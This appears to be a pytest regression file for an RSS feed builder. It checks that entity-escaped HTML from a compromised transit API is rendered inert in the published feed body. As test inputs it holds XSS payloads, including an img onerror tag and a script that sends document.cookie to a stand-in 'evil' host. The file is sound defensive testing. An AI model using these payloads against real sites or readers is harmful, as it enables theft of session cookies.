"""Stored HTML/JS injection (XSS) in the published ``<content:encoded>`` body.

Threat model (project Zero-Trust upstream contract, AGENTS.md §3): a
compromised / MITM'd transit API serves an item ``description`` carrying
entity-escaped angle brackets, e.g. ``&lt;img src=x onerror=...&gt;`` (the
literal form for JSON providers; the double-escaped ``&amp;lt;...`` form for
XML providers that survives one XML-decode layer).

``html_to_text`` runs the description through ``HTMLParser(convert_charrefs=
True)``, which DECODES those entities back into live ``<`` / ``>`` characters
in its *plain-text* output. That plain text is embedded verbatim into the
``<content:encoded>`` body, wrapped in a raw CDATA block, and rendered as HTML
by every conformant RSS reader. Without output-encoding at this HTML sink the
decoded ``<img onerror=...>`` becomes an executable tag in the subscriber's
reader.

The fix HTML-escapes the plain-text parts in :func:`_compose_description`
(the shared chokepoint for both the DE and EN feeds) before they are joined
with the builder's own ``<br/>`` separators.
"""

from __future__ import annotations

from datetime import UTC, datetime
from html.parser import HTMLParser
from typing import cast

from src import build_feed as bf
from src.feed_types import FeedItem


class _ReaderModel(HTMLParser):
    """Render a ``<content:encoded>`` body the way a feed reader would.

    ``convert_charrefs=True`` mirrors real reader/browser behaviour: an
    entity-escaped ``&lt;img&gt;`` decodes to *visible text*, never to a live
    tag, whereas a raw ``<img>`` is parsed as an executable element.
    """

    def __init__(self) -> None:
        super().__init__(convert_charrefs=True)
        self.live_tags: list[str] = []
        self.event_handler_attrs: list[tuple[str, str]] = []
        self._text: list[str] = []

    def handle_starttag(
        self, tag: str, attrs: list[tuple[str, str | None]]
    ) -> None:
        self.live_tags.append(tag)
        for name, _value in attrs:
            if name.lower().startswith("on"):
                self.event_handler_attrs.append((tag, name.lower()))

    def handle_startendtag(
        self, tag: str, attrs: list[tuple[str, str | None]]
    ) -> None:
        self.handle_starttag(tag, attrs)

    def handle_data(self, data: str) -> None:
        self._text.append(data)

    @property
    def visible_text(self) -> str:
        return "".join(self._text)


def _render(body: str) -> _ReaderModel:
    reader = _ReaderModel()
    reader.feed(body)
    reader.close()
    return reader


def _content_encoded_body(
    description: str,
    *,
    starts_at: datetime | None = None,
    ends_at: datetime | None = None,
) -> str:
    """Return the HTML body that lands inside the ``<content:encoded>`` CDATA."""
    item = cast(
        FeedItem,
        {
            "title": "Streckeninformation",
            "link": "https://example.com/incident",
            "description": description,
            "guid": "incident-1",
            "source": "ÖBB",
        },
    )
    formatted = bf._format_item_content(item, "incident-1", starts_at, ends_at)
    return formatted.desc_cdata


def test_entity_escaped_img_onerror_is_inert_in_content_encoded() -> None:
    payload = "&lt;img src=x onerror=alert(document.domain)&gt; Strecke gesperrt"
    body = _content_encoded_body(payload)
    reader = _render(body)

    # No executable tag / event handler may survive into the rendered HTML.
    assert "img" not in reader.live_tags
    assert reader.event_handler_attrs == []

    # The payload text is preserved but rendered inert (escaped brackets).
    assert "<img" not in body
    assert "&lt;img" in body
    assert "Strecke gesperrt" in reader.visible_text


def test_double_escaped_script_is_inert_in_content_encoded() -> None:
    payload = "&lt;script&gt;fetch('//evil/?'+document.cookie)&lt;/script&gt; Info"
    body = _content_encoded_body(payload)
    reader = _render(body)

    assert "script" not in reader.live_tags
    assert "<script" not in body
    assert "&lt;script&gt;" in body
    assert "Info" in reader.visible_text


def test_legitimate_line_break_and_ampersand_render_correctly() -> None:
    # Happy path: the only live markup is the <br/> the builder itself emits
    # between summary and timeframe; a literal '&' is correctly HTML-encoded
    # so readers display '&' rather than a broken/eaten entity.
    body = _content_encoded_body(
        "Wien & Graz gesperrt",
        starts_at=datetime(2026, 5, 24, tzinfo=UTC),
    )
    reader = _render(body)

    assert reader.live_tags == ["br"]
    assert reader.event_handler_attrs == []
    assert "Wien & Graz gesperrt" in reader.visible_text
    assert "&amp;" in body


def test_compose_description_escapes_text_but_keeps_br() -> None:
    # Unit-level guard on the shared DE+EN chokepoint: plain-text parts are
    # HTML-escaped, the structural <br/> separator the builder inserts is not.
    _, desc_html = bf._compose_description(
        "<b>x</b> & <i>y</i>", "[Seit 24.05.2026]"
    )
    assert "<b>" not in desc_html
    assert "<i>" not in desc_html
    assert "&lt;b&gt;" in desc_html
    assert "&amp;" in desc_html
    assert "<br/>" in desc_html
